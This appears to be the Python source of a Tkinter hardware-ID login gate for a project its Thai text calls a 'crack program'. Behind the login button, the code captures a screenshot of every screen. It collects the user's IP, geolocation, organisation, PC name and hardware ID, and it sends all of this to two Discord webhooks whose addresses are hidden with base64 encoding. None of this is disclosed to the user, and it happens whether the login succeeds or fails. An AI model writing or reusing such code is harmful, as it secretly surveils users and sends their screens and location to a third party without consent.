
OUTPUT_PATH = Path(__file__).parent
ASSETS_PATH = OUTPUT_PATH / Path(r"img\\")

def relative_to_assets(path: str) -> Path:
    return ASSETS_PATH / Path(path)

def generate_hwid():
    raw_hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).strip().decode()
    hwid = raw_hwid.splitlines()[1]
    hashed_hwid = hashlib.sha256(hwid.encode()).hexdigest()
    return hashed_hwid
def gethwid():
    blist = []
    uuid = subprocess.check_output('wmic csproduct get uuid', shell=False).decode()
    uuid = uuid.strip().split('\r\n')
    blist.append(uuid[1])
    blist = json.dumps(blist, ensure_ascii=False).encode('utf-8')
    blist = base64.b64encode(blist)
    return blist.decode('UTF-8')
datahwidreg = httpx.get("https://gist.githubusercontent.com/PRPPRO/217da7a365a2a3784d0c3b6dc782a79c/raw/2d3fc14ca9ba531ff2b8b9db10f693d041c6122a/hwid")
new_hwid = generate_hwid()[:16]
hw = gethwid()[:15]
mypcname = os.getlogin()
hwid = f'''{hw}-{mypcname}-{new_hwid}'''
ipinfo = httpx.get("https://ipinfo.io/json")
ipinfojson = ipinfo.json()
ip = ipinfojson.get('ip')
city = ipinfojson.get('city')
country = ipinfojson.get('country')
region = ipinfojson.get('region')
org = ipinfojson.get('org')
loc = ipinfojson.get('loc')

webhookusercanlogin_encoded_string = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3MjA4NzUxMjQ2NzY0MDM3MC9fMy1HVWVOTkFwSUFHS3NHY3ZIU3lwa1lxekc1WWZMa0RfZDlsa2gtVFlxN28tNlZGYk5XdURXSEZmZ25sM0dseTFQWA=='
webhookusercanlogin_decoded_string = base64.b64decode(webhookusercanlogin_encoded_string).decode('utf-8')
webhookusercanlogin = webhookusercanlogin_decoded_string
webhookusercantlogin_encoded_string = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3MjA4NzU1NjQ4MjY2NjU0Ni9aZkt4Zk9VWmxaZTFkaXhBRmhhSnZ3Q0pMaWhncmR3b1BXRnNPNTF2M3RFWUJHcG9UYTNKU00ybHR1QlJ6MnVIcUpjRw=='
webhookusercantlogin_decoded_string = base64.b64decode(webhookusercantlogin_encoded_string).decode('utf-8')
webhookusercantlogin = webhookusercantlogin_decoded_string
usercanlogin = f"คุณ {mypcname} ได้เข้าระบบสำเร็จ" 
usercantlogin = f"คุณ {mypcname} ได้เข้าระบบไม่สำเร็จ" 
projectname = "แคร็กโปรแกรม"
versionproject = "1"

def loginpass():
    image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
    image.save("imageprpsecurity.png")
    webhookusercanloginpic = DiscordWebhook(webhookusercanlogin, username=usercanlogin)
    with open("imageprpsecurity.png", "rb") as f:
        webhookusercanloginpic.add_file(file=f.read(), filename='imageprpsecurity.png')
    os.remove("imageprpsecurity.png")
    httpx.post(
        webhookusercanlogin, json={
            "content":"",
            "embeds": [
            {
              "title": f"User : {mypcname}",
              "tts": False,
              "description": f"""Project : {projectname} 
                Version : {versionproject} 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwid}
                IP : {ip}
                เมือง : {city}
                ประเทศ : {country}
                ภูมิภาค : {region}
                องค์กร : {org}
                โลเคชั่น : {loc}""",
              "color": 0x1cff00,
            }
          ],
          "username": usercanlogin,
          }
        )
    response = webhookusercanloginpic.execute()
def loginfaill():
    image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
    image.save("imageprpsecurity.png")
    webhookusercantloginpic = DiscordWebhook(webhookusercantlogin, username=usercantlogin)
    with open("imageprpsecurity.png", "rb") as f:
        webhookusercantloginpic.add_file(file=f.read(), filename='imageprpsecurity.png')
    os.remove("imageprpsecurity.png")
    httpx.post(
            webhookusercantlogin, json={
            "content":"",
            "embeds": [
            {
              "title": f"User : {mypcname}",
              "tts": False,
              "description": f"""Project : {projectname} 
                Version : {versionproject} 
                Status : เข้าไม่ระบบสำเร็จ 
                HWID : {hwid}
                IP : {ip}
                เมือง : {city}
                ประเทศ : {country}
                ภูมิภาค : {region}
                องค์กร : {org}
                โลเคชั่น : {loc}""",
              "color": 0xcf0a0a,
            }
          ],
          "username": usercantlogin,
          }
        )
    response = webhookusercantloginpic.execute()

def loginsus():
    if hwid in datahwidreg.text:
        loginpass()
        import file.hwid
        window.title(f"PRP Test LOCKHWID | User : {mypcname} | Status : Succeed | ✅ ")
    else:
        loginfaill()
        messagebox.showerror("Login Failed", "ไม่พบ HWID")
        window.title(f"PRP Test LOCKHWID | User : {mypcname} | Status : Failed | ❌ ")

def opendiscord():
    webbrowser.open("https://discord.gg/eHMmneSs3c")

window = Tk()

window.geometry("640x366")
window.configure(bg = "#FFFFFF")
window.title(f"PRP Test LOCKHWID | User : {mypcname}")



canvas = Canvas(
    window,
    bg = "#FFFFFF",
    height = 366,
    width = 641,
    bd = 0,
    highlightthickness = 0,
    relief = "ridge"
)

canvas.place(x = 0, y = 0)
image_image_1 = PhotoImage(
    file=relative_to_assets("image_1.png"))
image_1 = canvas.create_image(
    320.0,
    83.0,
    image=image_image_1
)

image_image_2 = PhotoImage(
    file=relative_to_assets("image_2.png"))
image_2 = canvas.create_image(
    320.0,
    266.46484375,
    image=image_image_2
)

image_image_3 = PhotoImage(
    file=relative_to_assets("image_3.png"))
image_3 = canvas.create_image(
    79.0,
    138.0,
    image=image_image_3
)

button_1 = Button(
    text="เข้าสู่ระบบ",
    borderwidth=0,
    highlightthickness=0,
    command=loginsus,
    relief="flat"
)
button_1.place(
    x=253.0,
    y=264.0,
    width=142.08837890625,
    height=35.26904296875
)

button_2 = Button(
    text="Discord",
    borderwidth=0,
    highlightthickness=0,
    command=opendiscord,
    relief="flat"
)
button_2.place(
    x=253.0,
    y=312.0,
    width=142.08837890625,
    height=35.26904296875
)

textbox = Text(window, state='disable')
textbox.pack()

textbox.config(height=1, width=44 ,font=("Inter", 22 * -1), state='normal')
textbox.insert(END, f"{hwid}\n")
print(hwid)
textbox.place(x=38, y=217)
textbox.config(bg='#ffffff')

canvas.create_text(
    160.0,
    165.0,
    anchor="nw",
    text="PRP",
    fill="#000000",
    font=("Inter ExtraBold", 32 * -1)
)
window.resizable(False, False)
window.mainloop()
